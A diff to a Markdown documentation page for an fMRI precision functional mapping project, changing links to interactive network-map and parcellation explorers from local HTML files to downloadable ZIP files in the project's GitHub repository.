@@ -10,11 +10,11 @@ These are general guidelines based on our data so far.
 
 ## Explore network-map parameters
 
-[![ME01 Lynch2024 network maps; select ridge and spatial-prior settings](assets/ridgepfm/ridgepfm-explorer-poster.png)](ridgepfm-explorer.html?raw=1)
+[![ME01 Lynch2024 network maps; select ridge and spatial-prior settings](assets/ridgepfm/ridgepfm-explorer-poster.png)](https://raw.githubusercontent.com/cjl2007/pfm-mefmri/main/docs/ridgepfm-explorer.zip)
 
-**[Download the interactive parameter explorer](ridgepfm-explorer.html?raw=1)**
+**[Download the interactive parameter explorer](https://raw.githubusercontent.com/cjl2007/pfm-mefmri/main/docs/ridgepfm-explorer.zip)**
 and open it in a browser. These maps use ME01’s full **10.5 retained hours** and
-the same surface layout as the [parcellation and softmax selector](ridgepfm-taxonomy-explorer.html?raw=1).
+the same surface layout as the [parcellation and softmax selector](https://raw.githubusercontent.com/cjl2007/pfm-mefmri/main/docs/ridgepfm-taxonomy-explorer.zip).
 The spatial = 1 setting illustrates strong prior influence outside the N = 20
 validation grid; the prior-only control discards individual FC entirely.
 
@@ -49,7 +49,7 @@ FC. Very large λ approaches direct template matching; λ = 0 is multitemplate O
 
 ## Full-data softmax maps
 
-The [network-map selector](ridgepfm-taxonomy-explorer.html?raw=1) shows every
+The [network-map selector](https://raw.githubusercontent.com/cjl2007/pfm-mefmri/main/docs/ridgepfm-taxonomy-explorer.zip) shows every
 network with its parcellation’s WTA borders. Softmax expresses relative network
 support. Low–High uses the same clipped display range (0.025–0.50) throughout;
 the underlying values are unchanged.
